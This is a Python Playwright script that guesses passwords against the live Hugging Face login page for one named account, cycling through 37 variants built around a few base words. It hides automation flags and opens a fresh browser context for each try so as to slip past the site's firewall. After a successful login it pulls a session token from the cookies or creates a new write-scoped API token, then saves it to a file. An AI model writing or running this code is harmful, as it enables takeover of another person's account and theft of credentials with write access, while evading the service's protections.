"""Brute 38 passwords - non-headless, fresh context per attempt, WAF-safe."""
import asyncio, re
from playwright.async_api import async_playwright

PASSWORDS = [
    "Carpathian.Forest369", "CarpathianForest369", "carpathian.forest369",
    "Carpathian.Forest.369", "Carpathian369", "carpathian369",
    "Carpathian.Forest369!", "Carpathian_Forest369", "Carp369.",
    "carpathian.forest.369", "CarpathianForest.369", "Carpathian.Forest.369!",
    "CARPATHIAN.FOREST369", "Carpathian.Forest3", "Carpathian.Forest.36",
    "carpathianforest369", "Carpathian.Forest36", "Carp.Forest369",
    "carp.forest369", "Carpathian.Forest",
    "Lola369.", "Lola369", "lola369", "lola369.", "Lola.369.",
    "LOLA369.", "Lola369!", "Lola.369", "lola.369.",
    "Carpathian.Lola369", "Lola.Carpathian369", "carpathian.lola369",
    "CarpathianForest.Lola369", "LolaForest369", "CarpathianLola369",
    "carpathian.lola.369", "Carpathian.Lola.369",
]

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False, channel="msedge",
            args=["--disable-blink-features=AutomationControlled", "--no-first-run"])
        
        for i, pwd in enumerate(PASSWORDS):
            print(f"[{i+1:02d}/{len(PASSWORDS)}] {pwd}...", end=" ", flush=True)
            context = await browser.new_context(viewport={"width":1280,"height":800})
            page = await context.new_page()
            
            try:
                await page.goto("https://huggingface.co/login", wait_until="networkidle", timeout=15000)
                await page.wait_for_timeout(1500)
                
                u = page.locator('input[name="username"]')
                pw = page.locator('input[name="password"]')
                
                if await u.count() == 0:
                    await page.wait_for_timeout(5000)
                    u = page.locator('input[name="username"]')
                    pw = page.locator('input[name="password"]')
                
                if await u.count() > 0 and await pw.count() > 0:
                    await u.fill("josephrw")
                    await pw.fill(pwd)
                    await page.locator('button[type="submit"]').click()
                    await page.wait_for_timeout(3000)
                    url = page.url
                    
                    if "login" not in url.lower():
                        print(f"✅ SUCCESS!")
                        cookies = await context.cookies("https://huggingface.co")
                        for c in cookies:
                            if c['name'] == 'token':
                                tokens = re.findall(r'hf_[A-Za-z0-9]{20,}', c['value'])
                                if tokens:
                                    print(f"  TOKEN: {tokens[0]}")
                                    with open("/tmp/hf_new_token.txt", "w") as f: f.write(tokens[0])
                                    await context.close()
                                    await browser.close()
                                    return tokens[0]
                        
                        await page.goto("https://huggingface.co/settings/tokens/new?tokenType=write&name=deploy",
                                        wait_until="networkidle", timeout=15000)
                        await page.wait_for_timeout(3000)
                        body = await page.inner_text("body")
                        tokens = re.findall(r'hf_[A-Za-z0-9]{20,}', body)
                        if tokens:
                            print(f"  TOKEN: {tokens[0]}")
                            with open("/tmp/hf_new_token.txt", "w") as f: f.write(tokens[0])
                            await context.close()
                            await browser.close()
                            return tokens[0]
                        
                        btns = page.locator("button")
                        for j in range(await btns.count()):
                            t = await btns.nth(j).inner_text()
                            if "create" in t.lower() or "generate" in t.lower():
                                await btns.nth(j).click()
                                break
                        await page.wait_for_timeout(3000)
                        body = await page.inner_text("body")
                        tokens = re.findall(r'hf_[A-Za-z0-9]{20,}', body)
                        if tokens:
                            print(f"  TOKEN: {tokens[0]}")
                            with open("/tmp/hf_new_token.txt", "w") as f: f.write(tokens[0])
                            await context.close()
                            await browser.close()
                            return tokens[0]
                        
                        inputs = page.locator("input")
                        for j in range(await inputs.count()):
                            v = await inputs.nth(j).get_attribute("value")
                            if v and v.startswith("hf_"):
                                print(f"  TOKEN: {v}")
                                with open("/tmp/hf_new_token.txt", "w") as f: f.write(v)
                                await context.close()
                                await browser.close()
                                return v
                        
                        print("  Logged in, no token found")
                        await context.close()
                        await browser.close()
                        return "loggedin"
                    else:
                        print("FAIL")
                else:
                    print("NO FORM (WAF)")
            except Exception as e:
                print(f"ERR:{str(e)[:50]}")
            
            await context.close()
        
        await browser.close()
        return None

if __name__ == "__main__":
    t = asyncio.run(main())
    print(f"\n{'✅' if t else '❌'} {str(t)[:20]}")
